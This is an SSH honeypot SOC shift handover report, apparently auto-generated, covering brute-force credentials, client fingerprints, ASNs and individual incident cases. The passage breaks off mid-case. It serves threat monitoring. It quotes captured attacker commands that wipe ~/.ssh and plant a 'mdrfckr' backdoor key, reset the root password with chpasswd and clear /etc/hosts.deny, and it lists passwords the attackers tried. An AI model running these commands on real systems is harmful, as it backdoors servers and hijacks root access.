# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-16 |
| **Generated At** | 2026-04-16T06:05:19Z |
| **Shift Time** | 06:05 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **239** |
| Confirmed Threats | **213** |
| False Positives Filtered | **26** (10.9%) |
| Unique Attacker IPs | **29** |
| Countries of Origin | **13** |
| High Severity Cases | **83** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **156** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **173** |
| Unique Credential Pairs | **93** |
| Unique Usernames | **37** |
| Unique Passwords | **89** |
| Successful Auth Pairs | **55** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 83 |
| `345gs5662d34` | 40 |
| `postgres` | 5 |
| `test` | 4 |
| `steam` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 40 |
| `3245gs5662d34` | 40 |
| `12345678` | 3 |
| `123` | 2 |
| `123qweQWE` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 40 |
| `root` | `3245gs5662d34` | 40 |
| `postgres` | `qazxsw` | 2 |
| `root` | `23452345` | 2 |
| `user` | `Admin123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qazwsx123456789..` | `181.103.2.67` | 2026-04-16T03:10:20 |
| `root` | `3245gs5662d34` | `181.103.2.67` | 2026-04-16T03:10:28 |
| `root` | `Root@4321` | `181.103.2.67` | 2026-04-16T03:18:22 |
| `root` | `QQaa000` | `181.103.2.67` | 2026-04-16T03:24:21 |
| `root` | `135790135790` | `181.103.2.67` | 2026-04-16T03:26:22 |
| `root` | `Qazwsx2020!@` | `181.103.2.67` | 2026-04-16T03:28:24 |
| `root` | `Root123123` | `181.103.2.67` | 2026-04-16T03:30:27 |
| `root` | `qQ123456` | `181.103.2.67` | 2026-04-16T03:36:32 |
| `root` | `Qwer112233` | `181.103.2.67` | 2026-04-16T03:44:14 |
| `root` | `qazwsx11111#$` | `152.32.131.112` | 2026-04-16T03:45:02 |
| `root` | `3245gs5662d34` | `152.32.131.112` | 2026-04-16T03:45:05 |
| `root` | `DDqq112233` | `181.103.2.67` | 2026-04-16T03:46:12 |
| `root` | `vps@123456` | `20.193.130.202` | 2026-04-16T03:46:53 |
| `root` | `3245gs5662d34` | `20.193.130.202` | 2026-04-16T03:46:54 |
| `root` | `Aa123` | `181.103.2.67` | 2026-04-16T03:48:14 |
| `root` | `aaBB123456` | `181.103.2.67` | 2026-04-16T03:50:23 |
| `root` | `free` | `181.103.2.67` | 2026-04-16T03:52:27 |
| `root` | `Admin2024@123` | `181.103.2.67` | 2026-04-16T03:56:23 |
| `root` | `zxcvbnm,./` | `106.254.54.101` | 2026-04-16T04:05:48 |
| `root` | `3245gs5662d34` | `106.254.54.101` | 2026-04-16T04:05:52 |
| `root` | `luis123` | `102.210.149.130` | 2026-04-16T04:07:02 |
| `root` | `3245gs5662d34` | `102.210.149.130` | 2026-04-16T04:07:07 |
| `root` | `Zb123456` | `110.39.9.140` | 2026-04-16T04:08:57 |
| `root` | `3245gs5662d34` | `110.39.9.140` | 2026-04-16T04:09:01 |
| `root` | `P@ss12345` | `122.166.167.154` | 2026-04-16T04:11:57 |
| `root` | `3245gs5662d34` | `122.166.167.154` | 2026-04-16T04:11:59 |
| `root` | `123.com.` | `14.103.122.90` | 2026-04-16T04:18:32 |
| `root` | `Cloud-12345` | `14.103.122.90` | 2026-04-16T04:19:42 |
| `root` | `ZAQ!2wsx2019!@` | `14.103.122.90` | 2026-04-16T04:29:24 |
| `root` | `Root@111` | `76.79.213.69` | 2026-04-16T04:42:49 |
| `root` | `3245gs5662d34` | `76.79.213.69` | 2026-04-16T04:42:56 |
| `root` | `hassan` | `76.79.213.69` | 2026-04-16T04:46:15 |
| `root` | `QWER-1234` | `76.79.213.69` | 2026-04-16T04:47:55 |
| `root` | `3edc4rfv#$` | `76.79.213.69` | 2026-04-16T04:52:47 |
| `root` | `Root4321.` | `76.79.213.69` | 2026-04-16T04:54:23 |
| `root` | `8888` | `76.79.213.69` | 2026-04-16T04:55:58 |
| `root` | `Qwertyu1` | `76.79.213.69` | 2026-04-16T05:01:01 |
| `root` | `qazwsxedc#` | `76.79.213.69` | 2026-04-16T05:04:15 |
| `root` | `BBbb123123` | `152.32.172.177` | 2026-04-16T05:06:14 |
| `root` | `3245gs5662d34` | `152.32.172.177` | 2026-04-16T05:06:17 |
| `root` | `xiaoxiao520` | `152.32.253.205` | 2026-04-16T05:06:38 |
| `root` | `3245gs5662d34` | `152.32.253.205` | 2026-04-16T05:06:41 |
| `root` | `23452345` | `171.25.158.47` | 2026-04-16T05:08:30 |
| `root` | `3245gs5662d34` | `171.25.158.47` | 2026-04-16T05:08:34 |
| `root` | `qazwsx01@` | `83.49.101.27` | 2026-04-16T05:12:52 |
| `root` | `3245gs5662d34` | `83.49.101.27` | 2026-04-16T05:12:59 |
| `root` | `root0000#` | `83.49.101.27` | 2026-04-16T05:14:38 |
| `root` | `aa123456@` | `76.79.213.69` | 2026-04-16T05:17:19 |
| `root` | `ZZaa112233` | `83.49.101.27` | 2026-04-16T05:21:31 |
| `root` | `23452345` | `83.49.101.27` | 2026-04-16T05:23:19 |
| `root` | `123456_asdf` | `83.49.101.27` | 2026-04-16T05:26:57 |
| `root` | `Aa2024` | `83.49.101.27` | 2026-04-16T05:35:31 |
| `root` | `Qwe#` | `83.49.101.27` | 2026-04-16T05:39:01 |
| `root` | `1QAZ2wsx@#` | `83.49.101.27` | 2026-04-16T05:44:20 |
| `root` | `qwe666` | `83.49.101.27` | 2026-04-16T05:51:11 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **239** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 226 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 211 | 19 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `f555226df196...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 211 | 19 | Modern SSH client |
| `95420f9d932d...` | libssh | 14 | 6 | — |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 40 | 12 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:RZ4eQMVqa6Vy"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.122.90`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `102.210.149.130`, `76.79.213.69`, `110.39.9.140`, `152.32.131.112`, `152.32.253.205`, `83.49.101.27`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **29** |
| Unique ASNs | **21** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | HIGH |
| `AS35100` | Patrik Lagerman | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (83)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-051f779c6073

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:10 |
| **Last Seen** | 2026-04-16 03:10 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:10:18` | `cowrie.session.connect` |
| `2026-04-16 03:10:18` | `cowrie.client.version` |
| `2026-04-16 03:10:18` | `cowrie.client.kex` |
| `2026-04-16 03:10:20` | `cowrie.login.success` |
| `2026-04-16 03:10:21` | `cowrie.session.params` |
| `2026-04-16 03:10:21` | `cowrie.command.input` |
| `2026-04-16 03:10:21` | `cowrie.command.failed` |
| `2026-04-16 03:10:21` | `cowrie.log.closed` |
| `2026-04-16 03:10:22` | `cowrie.session.params` |
| `2026-04-16 03:10:22` | `cowrie.command.input` |
| `2026-04-16 03:10:22` | `cowrie.session.file_download` |
| `2026-04-16 03:10:22` | `cowrie.log.closed` |
| `2026-04-16 03:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3877c6feafba

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:10 |
| **Last Seen** | 2026-04-16 03:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:10:26` | `cowrie.session.connect` |
| `2026-04-16 03:10:26` | `cowrie.client.version` |
| `2026-04-16 03:10:27` | `cowrie.client.kex` |
| `2026-04-16 03:10:28` | `cowrie.login.success` |
| `2026-04-16 03:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-521fbd3f8f25

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:18 |
| **Last Seen** | 2026-04-16 03:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:18:20` | `cowrie.session.connect` |
| `2026-04-16 03:18:20` | `cowrie.client.version` |
| `2026-04-16 03:18:20` | `cowrie.client.kex` |
| `2026-04-16 03:18:22` | `cowrie.login.success` |
| `2026-04-16 03:18:22` | `cowrie.session.params` |
| `2026-04-16 03:18:22` | `cowrie.command.input` |
| `2026-04-16 03:18:22` | `cowrie.command.failed` |
| `2026-04-16 03:18:23` | `cowrie.log.closed` |
| `2026-04-16 03:18:24` | `cowrie.session.params` |
| `2026-04-16 03:18:24` | `cowrie.command.input` |
| `2026-04-16 03:18:24` | `cowrie.session.file_download` |
| `2026-04-16 03:18:24` | `cowrie.log.closed` |
| `2026-04-16 03:18:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b3f284db9c1

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:18 |
| **Last Seen** | 2026-04-16 03:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:18:28` | `cowrie.session.connect` |
| `2026-04-16 03:18:28` | `cowrie.client.version` |
| `2026-04-16 03:18:29` | `cowrie.client.kex` |
| `2026-04-16 03:18:30` | `cowrie.login.success` |
| `2026-04-16 03:18:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc65f018bf62

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:24 |
| **Last Seen** | 2026-04-16 03:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:24:19` | `cowrie.session.connect` |
| `2026-04-16 03:24:19` | `cowrie.client.version` |
| `2026-04-16 03:24:20` | `cowrie.client.kex` |
| `2026-04-16 03:24:21` | `cowrie.login.success` |
| `2026-04-16 03:24:22` | `cowrie.session.params` |
| `2026-04-16 03:24:22` | `cowrie.command.input` |
| `2026-04-16 03:24:22` | `cowrie.command.failed` |
| `2026-04-16 03:24:23` | `cowrie.log.closed` |
| `2026-04-16 03:24:23` | `cowrie.session.params` |
| `2026-04-16 03:24:23` | `cowrie.command.input` |
| `2026-04-16 03:24:24` | `cowrie.session.file_download` |
| `2026-04-16 03:24:24` | `cowrie.log.closed` |
| `2026-04-16 03:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4ea5333a11a

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:24 |
| **Last Seen** | 2026-04-16 03:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:24:28` | `cowrie.session.connect` |
| `2026-04-16 03:24:28` | `cowrie.client.version` |
| `2026-04-16 03:24:28` | `cowrie.client.kex` |
| `2026-04-16 03:24:30` | `cowrie.login.success` |
| `2026-04-16 03:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-582212e1e9fa

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:26 |
| **Last Seen** | 2026-04-16 03:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:26:20` | `cowrie.session.connect` |
| `2026-04-16 03:26:20` | `cowrie.client.version` |
| `2026-04-16 03:26:21` | `cowrie.client.kex` |
| `2026-04-16 03:26:22` | `cowrie.login.success` |
| `2026-04-16 03:26:23` | `cowrie.session.params` |
| `2026-04-16 03:26:23` | `cowrie.command.input` |
| `2026-04-16 03:26:23` | `cowrie.command.failed` |
| `2026-04-16 03:26:23` | `cowrie.log.closed` |
| `2026-04-16 03:26:24` | `cowrie.session.params` |
| `2026-04-16 03:26:24` | `cowrie.command.input` |
| `2026-04-16 03:26:25` | `cowrie.session.file_download` |
| `2026-04-16 03:26:25` | `cowrie.log.closed` |
| `2026-04-16 03:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f8dc5ee875b

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:26 |
| **Last Seen** | 2026-04-16 03:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:26:29` | `cowrie.session.connect` |
| `2026-04-16 03:26:29` | `cowrie.client.version` |
| `2026-04-16 03:26:29` | `cowrie.client.kex` |
| `2026-04-16 03:26:31` | `cowrie.login.success` |
| `2026-04-16 03:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cedb2522735

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:28 |
| **Last Seen** | 2026-04-16 03:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:28:22` | `cowrie.session.connect` |
| `2026-04-16 03:28:22` | `cowrie.client.version` |
| `2026-04-16 03:28:22` | `cowrie.client.kex` |
| `2026-04-16 03:28:24` | `cowrie.login.success` |
| `2026-04-16 03:28:25` | `cowrie.session.params` |
| `2026-04-16 03:28:25` | `cowrie.command.input` |
| `2026-04-16 03:28:25` | `cowrie.command.failed` |
| `2026-04-16 03:28:25` | `cowrie.log.closed` |
| `2026-04-16 03:28:26` | `cowrie.session.params` |
| `2026-04-16 03:28:26` | `cowrie.command.input` |
| `2026-04-16 03:28:26` | `cowrie.session.file_download` |
| `2026-04-16 03:28:26` | `cowrie.log.closed` |
| `2026-04-16 03:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a77fdbef663

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:28 |
| **Last Seen** | 2026-04-16 03:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:28:30` | `cowrie.session.connect` |
| `2026-04-16 03:28:30` | `cowrie.client.version` |
| `2026-04-16 03:28:31` | `cowrie.client.kex` |
| `2026-04-16 03:28:32` | `cowrie.login.success` |
| `2026-04-16 03:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9289937e896

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:30 |
| **Last Seen** | 2026-04-16 03:30 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
